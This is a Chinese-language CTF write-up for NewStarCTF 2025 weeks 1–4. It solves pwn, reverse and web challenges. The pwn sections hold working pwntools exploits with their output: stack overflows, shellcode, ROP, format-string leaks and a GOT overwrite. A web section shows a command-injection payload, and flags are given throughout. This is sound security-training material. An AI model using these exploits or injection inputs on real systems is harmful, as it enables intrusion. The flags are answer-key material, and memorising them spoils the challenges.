**尝试1：**

```python
from pwn import *
r = remote("8.147.132.32", 18832)
r.sendline(b"A"*(256+8)+p64(0x401234)+p64(0))
r.interactive()
```

**分析：**这里的`0x401234`是后面地址，`+p64(0)`是为了对齐

失败并没有get到shell，在IDA的视图-A找一下0x401234的函数，发现并不是我们需要的后面函数

即题目给的地址0x401234是假的后门地址

**尝试2：**

重新找一下发现真正的后面地址是0x401200

```python
from pwn import *
r = remote("8.147.132.32", 18832)
r.sendline(b"A"*(256+8)+p64(0x401200)+p64(0))
r.interactive()
```

成功获得了shell

```cmd
python payload.py
[x] Opening connection to 8.147.132.32 on port 18832
[x] Opening connection to 8.147.132.32 on port 18832: Trying 8.147.132.32
[+] Opening connection to 8.147.132.32 on port 18832: Done
[*] Switching to interactive mode
Enter your input:----Welcome to EZoverflow!----
There is a glitch in this program that allows you to overflow the buffer.
Let me show you a sample of how it works:
This is the address of the backdoor function: 0x401234
Then fill the buffer with the trash and fill the return address with the address of the unexcuted function.
This is a function that is not supposed to be executed.
Now,Try to exploit it as I done and get the shell!
Enter your input:
Congratulations! You have found the backdoor!
You can now execute any command you want.
ls&cat flag
```

得到：flag{}



### input_function(复现)

#### 解题过程

**查看题目**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *buf; // [rsp+8h] [rbp-8h]

  init(argc, argv, envp);
  buf = mmap((void *)0x114514, 0x1000uLL, 7, 34, -1, 0LL);
  puts("please input a function(after compile)");
  read(0, buf, 0x500uLL);
  ((void (*)(void))buf)();
  return 0;
}
```

**分析：**

- `buf`可执行
- `buf`地址是`0x114514`

**编写恶意脚本**

```python
from pwn import *

context(os = "linux", arch = "amd64")
r = remote("127.0.0.1", 8571)

shellcode = asm(shellcraft.sh())
buf_addr = 0x114514

payload = shellcode + p64(buf_addr)
r.sendlineafter(b'\n', payload)

r.interactive()
```

**运行恶意脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to 127.0.0.1 on port 8571
[x] Opening connection to 127.0.0.1 on port 8571: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 8571: Done
[*] Switching to interactive mode
ls
bin
boot
core.11
core.13
core.15
core.23
core.9
dev
etc
flag
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
pwn
root
run
sbin
srv
start.sh
sys
tmp
usr
var
cat flag
flag{dd4ed90e-5190-79f9-cda3-cdfbed5fbc70}
```

**得到：flag{dd4ed90e-5190-79f9-cda3-cdfbed5fbc70}**



## Reverse

### X0r

#### 解题过程

打开IDA查看程序的主要伪代码

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char Str2[32]; // [rsp+20h] [rbp-60h] BYREF
  _BYTE v5[16]; // [rsp+40h] [rbp-40h]
  char Str[36]; // [rsp+50h] [rbp-30h] BYREF
  int v7; // [rsp+74h] [rbp-Ch]
  int j; // [rsp+78h] [rbp-8h]
  int i; // [rsp+7Ch] [rbp-4h]

  _main();
  puts("Please input your flag: ");
  scanf("%25s", Str);
  v7 = strlen(Str);
  if ( v7 == 24 )
  {
    for ( i = 0; i < v7; ++i )
    {
      if ( i % 3 )
      {
        if ( i % 3 == 1 )
          Str[i] ^= 0x11u;
        else
          Str[i] ^= 0x45u;
      }
      else
      {
        Str[i] ^= 0x14u;
      }
    }
    v5[0] = 19;
    v5[1] = 19;
    v5[2] = 81;
    for ( j = 0; j < v7; ++j )
      Str[j] ^= v5[j % 3];
    strcpy(Str2, "anu`ym7wKLl$P]v3q%D]lHpi");
    if ( !strcmp(Str, Str2) )
      puts("Right flag!");
    else
      puts("Wrong flag!");
    return 0;
  }
  else
  {
    puts("Wrong flag length!");
    return 0;
  }
}
```

化简源码得到

```c
  scanf("%25s", Str);
  v7 = strlen(Str);
  if ( v7 == 24 )
  {
    for ( i = 0; i < v7; ++i )
    {
      if ( i % 3 )
      {
        if ( i % 3 == 1 )
          Str[i] ^= 0x11u;
        else
          Str[i] ^= 0x45u;
      }
      else
      {
        Str[i] ^= 0x14u;
      }
    }
    v5[0] = 19;
    v5[1] = 19;
    v5[2] = 81;
    for ( j = 0; j < v7; ++j )
      Str[j] ^= v5[j % 3];
    strcpy(Str2, "anu`ym7wKLl$P]v3q%D]lHpi");
    if ( !strcmp(Str, Str2) )
```

**分析：**

这是它加密的部分，可知它的加密跟三个因素有关`明文`、`索引`、`密文`

我们已知了密文，可知索引，要求密文

因为它这个加密算法的可逆性不强，我们选择正向爆破

即根据索引遍历[33,126]的可打印ASCLL字符走这个加密规则然后跟密文进行比较

构造并执行payload.py

```python
c = "anu`ym7wKLl$P]v3q%D]lHpi"
xor_list = (19,19,81)
index = 0

def encrypt(m):
    global index
    temp = ord(m)
    match index%3:
        case 0:
            temp ^= 0x14
            temp ^= xor_list[index%3]
        case 1:
            temp ^= 0x11
            temp ^= xor_list[index%3]
        case 2:
            temp ^= 0x45
            temp ^= xor_list[index%3]
    if chr(temp) == c[index]:
        print(m,end='')
        index += 1

if __name__ == "__main__":
    while index < len(c) - 1:
        for i in range(33, 127):
            if not index >= len(c):
                encrypt(chr(i))
                
# flag{y0u_Kn0W_b4s1C_xOr}
```

得到：flag{y0u_Kn0W_b4s1C_xOr}



### plzdebugme

#### 解题过程

看到源码

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char c; // [rsp+Fh] [rbp-5E1h]
  uint32_t v[2]; // [rsp+28h] [rbp-5C8h] BYREF
  uint32_t k[4]; // [rsp+30h] [rbp-5C0h] BYREF
  RC4_CTX rc4; // [rsp+40h] [rbp-5B0h] BYREF
  uint8_t rc4_key[4]; // [rsp+150h] [rbp-4A0h] BYREF
  uint8_t chacha_nonce[12]; // [rsp+154h] [rbp-49Ch]
  uint8_t aes_key[16]; // [rsp+160h] [rbp-490h] BYREF
  uint8_t aes_iv[16]; // [rsp+170h] [rbp-480h] BYREF
  uint8_t chacha_key[32]; // [rsp+180h] [rbp-470h]
  uint8_t rc4_out[32]; // [rsp+1A0h] [rbp-450h] BYREF
  uint8_t aes_out[32]; // [rsp+1C0h] [rbp-430h] BYREF
  unsigned __int8 out[1032]; // [rsp+1E0h] [rbp-410h] BYREF
  unsigned __int64 v17; // [rsp+5E8h] [rbp-8h]

  v17 = __readfsqword(0x28u);
  printf(" Debug is important!!!.\n");
  printf("You can get the flag directly by debugging\n");
  printf("The debugging process is similar to that of Windows\n");
  printf("HINT: You can find the flag character style in the function x0r(), break on it\n");
  hexchar2int(c);
  *(_QWORD *)chacha_key = 0xA9A8A7A6A5A4A3A2LL;
  *(_QWORD *)&chacha_key[8] = 0xC2C1B6B5B9B5B3B1LL;
  *(_QWORD *)&chacha_key[16] = 0LL;
  *(_QWORD *)&chacha_key[24] = 0LL;
  *(_QWORD *)chacha_nonce = 0x69D4D4DDDD4D2D5LL;
  *(_DWORD *)&chacha_nonce[8] = 0;
  strcpy((char *)rc4_key, "Wow");
  v3 = strlen((const char *)rc4_key);
  rc4_init(&rc4, rc4_key, v3);
  rc4_crypt(&rc4, ciphertext, rc4_out, 32);
  *(_QWORD *)aes_key = 0xA6D2AE2816157E2BLL;
  *(_QWORD *)&aes_key[8] = 0x1141467597F7ABLL;
  *(_QWORD *)aes_iv = 0x4511144511144511LL;
  *(_QWORD *)&aes_iv[8] = 0x1114451114451114LL;
  aes_de(aes_out, rc4_out, 32, aes_key, aes_iv);
  memcpy(out, aes_out, 0x20uLL);
  v[0] = 1751720303;
  v[1] = 1633904993;
  k[0] = 1;
  k[1] = 2;
  k[2] = 3;
  k[3] = 4;
  btea(v, 2, k);
  x0r(out, 0x20uLL);
  putchar(10);
  return 0;
}

void __cdecl x0r(const unsigned __int8 *cipher, size_t len)
{
  size_t v2; // rax
  size_t i; // [rsp+18h] [rbp-18h]
  size_t i_0; // [rsp+20h] [rbp-10h]

  v2 = len;
  if ( len > 0x20 )
    v2 = 32LL;
  for ( i = 0LL; i < v2; ++i )
    flag[i] = cipher[i] ^ 0x51;
  if ( v2 <= 0x1F )
  {
    for ( i_0 = v2; i_0 <= 0x1F; ++i_0 )
      flag[i_0] = 0;
  }
  flag[32] = 0;
}
```

**分析：**

这道题的加密逻辑非常混乱，但我们不需要复现它的加密场景

放弃静态分析，改用动态调试

将程序扔进linux虚拟机的IDA里并在

```c
  flag[32] = 0;
```

处打上断点进行调试

发现调试失败，简单排查了一下发现是权限问题，我们通过命令行添加elf运行权限

```shell
chmod +x plzdebugme
```

然后再次运行调试获得数据

```
.bss:0000555555559060 flag            db 66h, 6Ch, 61h, 67h, 7Bh, 49h, 74h, 33h, 5Fh, 44h, 33h
.bss:0000555555559060                                         ; DATA XREF: x0r+43↑o
.bss:0000555555559060                                         ; x0r:loc_5555555566FA↑o
.bss:000055555555906B                 db 62h, 75h, 67h, 47h, 5Fh, 54h, 31h, 31h, 6Dh, 65h, 21h
.bss:0000555555559076                 db 5Fh, 6Ch, 65h, 33h, 5Fh, 70h, 6Ch, 61h, 79h, 7Dh, 0
.bss:0000555555559081                 align 8
```

16进制转ASCLL：

```
66h → 0x66 → 102 → 'f'
6Ch → 0x6C → 108 → 'l'
61h → 0x61 → 97 → 'a'
67h → 0x67 → 103 → 'g'
7Bh → 0x7B → 123 → '{'
49h → 0x49 → 73 → 'I'
74h → 0x74 → 116 → 't'
33h → 0x33 → 51 → '3'
5Fh → 0x5F → 95 → '_'
44h → 0x44 → 68 → 'D'
33h → 0x33 → 51 → '3'
62h → 0x62 → 98 → 'b'
75h → 0x75 → 117 → 'u'
67h → 0x67 → 103 → 'g'
47h → 0x47 → 71 → 'G'
5Fh → 0x5F → 95 → '_'
54h → 0x54 → 84 → 'T'
31h → 0x31 → 49 → '1'
31h → 0x31 → 49 → '1'
6Dh → 0x6D → 109 → 'm'
65h → 0x65 → 101 → 'e'
21h → 0x21 → 33 → '!'
5Fh → 0x5F → 95 → '_'
6Ch → 0x6C → 108 → 'l'
65h → 0x65 → 101 → 'e'
33h → 0x33 → 51 → '3'
5Fh → 0x5F → 95 → '_'
70h → 0x70 → 112 → 'p'
6Ch → 0x6C → 108 → 'l'
61h → 0x61 → 97 → 'a'
79h → 0x79 → 121 → 'y'
7Dh → 0x7D → 125 → '}'
```

得到：flag{It3_D3bugG_T11me!_le3_play}



# Week2

## Web

### DD 加速器(复现)

#### 解题过程

```shell
127.0.0.1;ls / -aR
```

```shell
PING 127.0.0.1 (127.0.0.1) 1400(1428) bytes of data.
1408 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.026 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.026/0.026/0.026/0.000 ms
/:
.
..
.1s57edxz4rrtxjev8t2xemhuzpz6vivm
bin
boot
dev
etc
flag
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var

/.1s57edxz4rrtxjev8t2xemhuzpz6vivm:
.
..
flag
```

```shell
127.0.0.1;cat /.1s*/flag
```

```shell
PING 127.0.0.1 (127.0.0.1) 1400(1428) bytes of data.
1408 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.039 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.039/0.039/0.039/0.000 ms
flag{c9f003a8-dc52-ecae-6ee1-a6b98c41bcb8}
```

**得到：flag{c9f003a8-dc52-ecae-6ee1-a6b98c41bcb8}**



## pwn

### syscall(复现)

#### 解题过程

**查看题目**

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init(&argc);
  write(1, "welcome to newstarctf2025 week2!\n", 33);
  write(1, "pwn it guys!\n", 13);
  func();
  return 0;
}

int func()
{
  _BYTE v1[14]; // [esp+6h] [ebp-12h] BYREF

  return read(0, v1, 100);
}
```

**分析**

- 简单的栈溢出漏洞利用

**信息搜集**

```shell
checksec pwn
```

```shell
[*] '/home/kali/Desktop/ctf/pwn'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

**分析**

- Linux32位小端序

**数据搜集**

```shell
strings -a -t x pwn | grep "/bin/sh"
```

```

```

```shell
objdump -d pwn | grep "int80"
```

```shell
08073a00 <_dl_sysinfo_int80>:
```

**分析**

- 这题没有`/bin/sh`
- 但是这题有`int80`
- 我们可以用`read`写入后，再用`exec`调用获取shell

```shell
ropper -f pwn --search "pop eax; ret;"
```

```shell
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop eax; ret;

[INFO] File: pwn
0x080b438a: pop eax; ret;
```

```shell
ropper -f pwn --search "pop ebx; ret;"
```

```shell
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop ebx; ret;

[INFO] File: pwn
0x08049022: pop ebx; ret;
```

```shell
ropper -f pwn --search "pop ecx; ret;"
```

```shell
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop ecx; ret;

[INFO] File: pwn
0x0804985a: pop ecx; ret;
```

```shell
ropper -f pwn --search "pop edx; ret;"
```

```shell
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop edx; ret;

[INFO] File: pwn
0x0804985c: pop edx; ret;
```

**编写恶意脚本**

```python
from pwn import *

r = remote("127.0.0.1", 6193)
elf = ELF("./syscall")

pop_eax_ret_addr = 0x080b438a
pop_ebx_ret_addr = 0x08049022
pop_ecx_ret_addr = 0x0804985a
pop_edx_ret_addr = 0x0804985c
int80_addr = 0x08073a00
bss_addr = elf.bss()

read_num = 0x03
exec_num = 0x0b

read_payload = p32(pop_eax_ret_addr) + p32(read_num)
read_payload += p32(pop_edx_ret_addr) + p32(8)
read_payload += p32(pop_ecx_ret_addr) + p32(bss_addr)
read_payload += p32(pop_ebx_ret_addr) + p32(0)

exec_payload = p32(pop_eax_ret_addr) + p32(exec_num)
exec_payload += p32(pop_edx_ret_addr) + p32(0)
exec_payload += p32(pop_ecx_ret_addr) + p32(0)
exec_payload += p32(pop_ebx_ret_addr) + p32(bss_addr)

payload = cyclic(0x12)
payload += p32(0xdeadbeef)
payload += read_payload + p32(int80_addr) + exec_payload + p32(int80_addr)
r.sendafter(b"pwn it guys!\n", payload)
r.sendline(b"/bin/sh\x00")

r.interactive()
```

**运行恶意脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to 127.0.0.1 on port 6193
[x] Opening connection to 127.0.0.1 on port 6193: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 6193: Done
[*] 'D:\\Work\\test\\testPython\\src\\com\\probie\\test01\\syscall'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
[*] Switching to interactive mode
ls
bin
boot
dev
etc
flag
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
cat flag
flag{93d47df7-288a-e11e-e371-d8249293066c}
```

**得到：flag{93d47df7-288a-e11e-e371-d8249293066c}**



### 刻在栈里的秘密(复现)

#### 解题过程

**查看题目**

```shell
nc 127.0.0.1 41397
```

```shell
现在有一个密码隐藏在栈上(•̀ᴗ• )
你需要做的是通过格式化字符串来泄露这个密码o(´^｀)o！m, 告诉我密码我就给你flag
哦，对了对了，你还要告诉我指向这个密码的地址
在此之前, 你可以了解一下各个格式化字符串的用法, 例如 %p, %s, %d, 以及 $ 符号. emmm...还有 x86-64 函数调用约定!

指向密码的指针被存放在了 0x7ffe5369b7c0 中, 同时栈顶指针是 0x7ffe5369b740 .
他们之间的距离是:也就是说, 在printf之前, 格式字符串的参数看起来就像 ( *・ω・)

0x7ffe5369b7c0: [?] <-- 密码在这里捏
0x7ffe5369b7b8: [?]
0x7ffe5369b7b0: [?]
0x7ffe5369b7a8: [?]
0x7ffe5369b7a0: [?]
0x7ffe5369b798: [?]
0x7ffe5369b790: [?]
0x7ffe5369b788: [?]
0x7ffe5369b780: [?]
0x7ffe5369b778: [?]
0x7ffe5369b770: [?]
0x7ffe5369b768: [?]
0x7ffe5369b760: [?]
0x7ffe5369b758: [?]
0x7ffe5369b750: [?]
0x7ffe5369b748: [?]
0x7ffe5369b740: [?]
0x7ffe5369b738: [?]
0x7ffe5369b730: [?] <-- 栈顶在这里捏
R9:             [?]
R8:             [?]
RCX:            [?]
RDX:            [?]
RSI:            [?]
RDI:            [格式化字符串]

现在给你两次输入的机会, 补要输入太长的数据哦. 
接着我会使用printf, 用你的输入作为printf的参数. 
看起来就像 printf(your_input), 实际上这样是很危险的, 好孩子不要模仿^^. 来吧让我看看你的输入
```

**计算**

- 目标地址`0x7ffe5369b7c0`，栈顶地址`0x7ffe5369b730`
- 偏移量 = `0x7ffe5369b7c0 - 0x7ffe5369b730 = 0x90 = 144`
- 偏移个数 = `144 / 8 = 18`
- 算上寄存器的偏移个数 = `18 + 6 = 24`

**构造恶意输入**

```shell
%24$p
```

```shell
printf第 1 次启动!
0x7fffd1f57ff0
```

```shell
%24$s
```

```shell
printf第 2 次启动!
FVNXNJUJNNPKHAW
```

**发送恶意输入**

```shell
现在来验证一下密码吧 ( ⁼̴̀ .̫ ⁼̴ )✧！输入你的密码：
FVNXNJUJNNPKHAW
现在来验证一下密码的指针吧 ( ⁼̴̀ .̫ ⁼̴ )✧！输入你的密码：
给我输入一个类似 0x114514 的 16 进制数!
0x7fffd1f57ff0
好棒 ̋(๑˃́ꇴ˂̀๑) 给你flag
flag{173e123a-bc13-8ffe-1a9f-4daace21c965}
```

**得到：flag{173e123a-bc13-8ffe-1a9f-4daace21c965}**



# Week3

## Pwn

### fmt&canary(复现)

#### 解题过程

**查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[40]; // [rsp+0h] [rbp-30h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  init(argc, argv, envp);
  puts(&::s);
  puts(&byte_402050);
  do
  {
    memset(s, 0, sizeof(s));
    puts(&byte_40209D);
    read(0, s, 0x27uLL);
    printf(s);
  }
  while ( strcmp(s, "end\n") );
  puts(&byte_4020AA);
  printf(&format);
  read(0, s, 0x100uLL);
  return 0;
}
```

**编写恶意脚本**

```shell
from pwn import *

r = remote("127.0.0.1", 2698)
libc = ELF("./libc.so.6")

payload = b"%11$p"
r.sendlineafter(b"!\n", payload)

canary = int(r.recvuntil(b'\n'), 16)

payload = b"%33$p"
r.sendlineafter(b"!\n", payload)

libc_leak_addr = int(r.recvuntil(b'\n'), 16)
libc_base_addr = libc_leak_addr - 128 - libc.sym["__libc_start_main"]

payload = b"end"
r.sendlineafter(b"!\n", payload)

pop_rdi_ret_addr = libc_base_addr + 0x2a3e5
bin_sh_addr = libc_base_addr + next(libc.search(b"/bin/sh"))
ret_addr = libc_base_addr + 0x2db7d
system_addr = libc_base_addr + libc.sym["system"]

payload = cyclic(40)
payload += p64(canary)
payload += p64(0xdeadbeef)
payload += p64(pop_rdi_ret_addr) + p64(bin_sh_addr) + p64(ret_addr) + p64(system_addr)
r.sendafter(b':', payload)

r.interactive()
```

**运行恶意脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to 127.0.0.1 on port 2698
[x] Opening connection to 127.0.0.1 on port 2698: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 2698: Done
[*] 'D:\\Work\\test\\testPython\\src\\com\\probie\\test01\\libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[*] Switching to interactive mode
ls
entry.sh
flag
fmt_canary
cat flag
flag{0049aac0-7f82-9af0-679e-0543b1064a88}
```

**得到：flag{0049aac0-7f82-9af0-679e-0543b1064a88}**



# Week4

## Pwn

### fmt&got(复现)

#### 解题过程

**信息搜集**

```shell
checksec pwn
```

```shell
[*] '/home/kali/Desktop/ctf/pwn/pwn'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

**查看题目**

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rdx
  __int64 v4; // rcx
  __int64 v5; // r8
  __int64 v6; // r9
  char format[264]; // [rsp+0h] [rbp-110h] BYREF
  unsigned __int64 v8; // [rsp+108h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  setup(argc, argv, envp);
  puts("tell me what you want to say:");
  printf("\n> ");
  strcpy(format, "That's what you want to say...    ");
  read(0, &format[34], 0x100uLL);
  printf(format, &format[34], v3, v4, v5, v6);
  puts("\nthat's it? boring... bye");
  exit(1);
}

unsigned __int64 read_flag()
{
  FILE *stream; // [rsp+8h] [rbp-58h]
  char s[72]; // [rsp+10h] [rbp-50h] BYREF
  unsigned __int64 v3; // [rsp+58h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  stream = fopen("flag", "r");
  if ( !stream )
  {
    puts("flag not found! Contact admin if you see this on the remote server.");
    exit(1);
  }
  fgets(s, 64, stream);
  printf("How you do that... here is the flag:  %s\n", s);
  fclose(stream);
  return v3 - __readfsqword(0x28u);
}
```

**数据搜集**

```assembly
.text:0000000000401236                 public read_flag
```

```shell
gdb pwn
start
got

0000000000403430 R_X86_64_JUMP_SLOT  exit@GLIBC_2.2.5
```

**编写最终脚本**

```python
from pwn import *

context(arch = "amd64", os = "linux")

r = remote("127.0.0.1", 12517)

exit_got_addr = 0x403430
readflag_addr = 0x401236

payload = cyclic(6) + fmtstr_payload(11, {exit_got_addr: readflag_addr}, 40, 'byte')
r.sendlineafter('>', payload)

r.interactive()
```

**运行最终脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to 127.0.0.1 on port 12517
[x] Opening connection to 127.0.0.1 on port 12517: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 12517: Done
D:\Environment\python\python-3.13.0-amd64\Lib\site-packages\pwnlib\tubes\tube.py:876: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[*] Switching to interactive mode
 That's what you want to say...    aaaaba             �                                                                                                                                                                                                                           aaaaba04@
that's it? boring... bye
How you do that... here is the flag:  flag{e6127c6f-c249-dad1-fee7-217824af8d2a}
```

**得到：flag{e6127c6f-c249-dad1-fee7-217824af8d2a}**



# 后记

## 赠言

### 好好吃饭，认真睡觉。感谢相遇，铭记学习。——BProbie

